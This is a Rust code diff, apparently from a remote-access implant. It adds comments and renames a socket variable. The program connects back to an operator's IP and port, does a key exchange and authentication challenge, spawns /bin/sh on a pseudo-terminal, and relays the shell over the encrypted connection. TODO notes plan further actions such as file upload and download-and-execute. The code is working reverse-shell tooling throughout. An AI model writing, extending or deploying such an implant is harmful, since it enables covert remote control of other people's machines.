@@ -26,6 +26,7 @@ use auxv::getauxval;
 use kex::{play_auth_challenge_remote, play_dh_kex_remote};
 use relay::{relay, RelayNode};
 
+// This little wrapper simply dereferences a pointer
 fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
 	if 0 != rand_ptr as usize {
 		// Assuming everything worked out correctly, this dereference
@@ -47,6 +48,7 @@ fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
 pub struct PtyMaster(RawFd);
 
 impl io::Read for PtyMaster {
+	// A wrapper for libc::read
 	fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
 		let res = unsafe {
 			libc::read(
@@ -65,6 +67,7 @@ impl io::Read for PtyMaster {
 }
 
 impl io::Write for PtyMaster {
+	// A wrapper for libc::write
 	fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
 		let res = unsafe {
 			libc::write(
@@ -80,13 +83,14 @@ impl io::Write for PtyMaster {
 			Ok(res as usize)
 		}
 	}
-
+	// When not using the FILE object, fd writes are not buffered.
 	fn flush(&mut self) -> io::Result<()> {
 		Ok(())
 	}
 }
 
 impl AsRawFd for PtyMaster {
+	// This trait is used by the relay
 	fn as_raw_fd(&self) -> RawFd {
 		self.0
 	}
@@ -190,7 +194,6 @@ enum RemoteError {
 	#[error("libc error")]
 	Libc,
 }
-
 fn main_wrapper(
 	argc: i32,
 	argv: *const *const c_char,
@@ -210,9 +213,11 @@ fn main_wrapper(
 	let key_str = unsafe { CStr::from_ptr(argv_ptrs[2]) }
 		.to_str()
 		.or(Err(RemoteError::Arguments))?;
-	// Parse the IP
+
+	// Parse the IP:port
 	let addr_l: SocketAddr =
 		ip_str.parse().or(Err(RemoteError::ArgumentsIP))?;
+
 	// Parse the public key which should just be the base64 component
 	//  on a single line
 	let mut rebuilt = [0u8; 1024];
@@ -223,25 +228,25 @@ fn main_wrapper(
 	};
 	let pub_l = PublicKey::from_sec1_bytes(&rebuilt[..rebuilt_sz])
 		.or(Err(RemoteError::ArgumentsKey))?;
-
 	debug!(
 		"Found local's key:\n{:?}\nAnd address: {:#}",
 		pub_l, addr_l,
 	);
 
-	// Seed the RNG
-	// Prefer the auxiliary vector's random data entry for seeding
+	// Collect a seed for the RNG. Prefer the auxiliary vector's
+	// random data entry for seeding
 	let rand_ptr =
 		getauxval(envp, libc::AT_RANDOM as usize) as *const u64;
 	let seed1 = get_rand_seed(rand_ptr);
 
 	// TODO: Register SIGALRM
 
-	// Open the socket to remote
-	let mut remote =
+	// Open the socket to local
+	let mut local =
 		TcpStream::connect(addr_l).or(Err(RemoteError::Connect))?;
+
 	// Get the shared AES key
-	let key = play_dh_kex_remote(&mut remote, &pub_l, seed1)
+	let key = play_dh_kex_remote(&mut local, &pub_l, seed1)
 		.or(Err(RemoteError::KEX))?;
 
 	// Create a new rng for the challenge and nonce values
@@ -254,10 +259,16 @@ fn main_wrapper(
 		ChaCha20Rng::from_entropy()
 	};
 
-	// Challenge the remote
+	// Challenge the local
 	#[cfg(feature = "challenge")]
-	play_auth_challenge_remote(&mut remote, &pub_l, &mut rng)
+	play_auth_challenge_remote(&mut local, &pub_l, &mut rng)
 		.or(Err(RemoteError::Challenge))?;
+
+	// TODO: get the requested action from local
+	//  this might be something like:
+	//  Action::Shell
+	//  Action::PutFile
+	//  Action::DownloadExecute
 
 	// TODO: unregister SIGALRM
 
@@ -274,6 +285,8 @@ fn main_wrapper(
 	if 0 > unsafe { libc::unlockpt(master) } {
 		panic!("Unable to unlockpt");
 	}
+
+	// Fork so we can do both the relay and the requested action
 	match unsafe { libc::fork() } {
 		-1 => return Err(RemoteError::LibcFork),
 		0 => {
@@ -322,7 +335,8 @@ fn main_wrapper(
 					return Err(RemoteError::Libc);
 				}
 			}
-			//  - setup /bin/sh command
+			// Execute the requested Action
+			//  TODO: match on action and call correct one
 			let sh = b"/bin/sh\0";
 			let mut argv_ptr = [0 as *const c_char; 2];
 			argv_ptr[0] = sh.as_ptr() as *const c_char;
@@ -366,7 +380,7 @@ fn main_wrapper(
 				readable: PtyMaster(master),
 				writeable: PtyMaster(master),
 			};
-			match relay(&mut node1, &mut remote, &key, &mut rng) {
+			match relay(&mut node1, &mut local, &key, &mut rng) {
 				Ok(_) => {
 					debug!("Remote finished relay");
 					()
